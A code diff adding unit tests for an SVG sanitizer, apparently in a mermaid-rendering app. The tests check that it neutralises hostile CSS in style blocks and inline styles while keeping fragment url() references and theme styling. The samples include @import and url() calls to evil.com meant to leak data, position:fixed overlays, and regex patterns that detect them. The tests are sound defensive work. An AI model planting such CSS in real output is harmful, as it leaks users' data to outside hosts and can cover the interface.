@@ -61,4 +61,65 @@ describe("sanitizeSvg", () => {
     expect(sanitizeSvg(null)).toBe("");
     expect(sanitizeSvg(undefined)).toBe("");
   });
+
+  // ---- Main-document CSS containment (audit #13) ----
+  //
+  // A <style> inside an SVG applies to the WHOLE document, and this sink is
+  // the privileged main window — model CSS must not reach the app's real
+  // stylesheet.
+
+  it("neutralizes @import, remote url(), and position:fixed inside <style>", () => {
+    const svg =
+      `<svg><style>.evil { @import url("https://evil.com/x.css"); ` +
+      `background: url(https://evil.com/?leak); position: fixed; inset: 0; } ` +
+      `.ok { fill: blue; }</style><rect width="5" height="5"/></svg>`;
+    const out = sanitizeSvg(svg);
+    // The @import at-rule is replaced by an inert CSS comment.
+    expect(out).toContain("/* removed: @import */");
+    expect(out).not.toMatch(/@import\s+url/i);
+    // (?<![-\w]) so the mangled "refused-url(" tail doesn't count as url(.
+    expect(out).not.toMatch(/(?<![-\w])url\(\s*['"]?\s*https/i);
+    expect(out).toMatch(/refused-url\(/);
+    expect(out).not.toMatch(/(?<![-\w"'])position\s*:\s*fixed/i);
+    expect(out).toMatch(/refused-position/);
+    // Legitimate rules in the same style block survive.
+    expect(out).toContain("fill: blue");
+    // The <style> element itself is kept (mermaid needs it for theming).
+    expect(out).toContain("<style");
+  });
+
+  it("keeps fragment url() references (mermaid markers/filters)", () => {
+    const svg =
+      `<svg><style>.arrow { filter: url(#glow); clip-path: url('#clip'); }</style>` +
+      `<path marker-end="url(#arrow)" d="M0 0 L1 1"/></svg>`;
+    const out = sanitizeSvg(svg);
+    expect(out).toContain("url(#glow)");
+    expect(out).toContain("url('#clip')");
+    expect(out).toContain('marker-end="url(#arrow)"');
+  });
+
+  it("neutralizes dangerous CSS in inline style attributes", () => {
+    const svg =
+      `<svg><rect style="fill: url(https://evil.com/?leak); position: absolute" width="5" height="5"/>` +
+      `<text style="font-size: 12px">keep me</text></svg>`;
+    const out = sanitizeSvg(svg);
+    expect(out).not.toMatch(/(?<![-\w])url\(\s*['"]?\s*https/i);
+    expect(out).toMatch(/refused-url\(/);
+    expect(out).not.toMatch(/(?<![-\w"'])position\s*:\s*absolute/i);
+    expect(out).toMatch(/refused-position/);
+    // Benign inline styles survive.
+    expect(out).toContain("font-size: 12px");
+  });
+
+  it("keeps benign themeCSS flowing through mermaid's init directive", () => {
+    // themeCSS is the documented mermaid escape hatch into <style>; benign
+    // declarations must not be mangled by the containment pass.
+    const svg =
+      `<svg><style>.node rect { fill: #ececff; stroke: #9370db; stroke-width: 1px; } ` +
+      `.lbl { font-family: "trebuchet ms", verdana; }</style></svg>`;
+    const out = sanitizeSvg(svg);
+    expect(out).toContain("fill: #ececff");
+    expect(out).toContain("stroke: #9370db");
+    expect(out).toContain("font-family");
+  });
 });
